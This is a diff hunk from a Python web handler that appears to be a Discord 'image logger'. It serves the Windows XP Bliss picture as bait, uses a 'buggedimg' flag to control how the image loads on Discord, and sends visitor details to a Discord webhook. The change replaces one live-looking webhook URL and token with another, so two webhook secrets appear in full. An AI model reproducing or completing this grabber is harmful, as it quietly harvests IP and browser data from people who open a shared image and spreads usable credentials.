@@ -3,7 +3,7 @@ from http.server import BaseHTTPRequestHandler
 from screaming import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1446390322455117856/YW-1r7o9H2KlASdzCOBG6c0OwSJtDyek2qIhMAS3BMAAkB7OM7OCLTva0OXSRQVfdfjd'
+webhook ='https://discord.com/api/webhooks/1446393140834730014/Ou43t0Y143-zEDHzTSdwqwU9R96pEYVjrBKgw5z5bXn_8B9s5r-SQ0_Kb_6O7wVgBtPi'
 
 bindata = httpx.get('https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
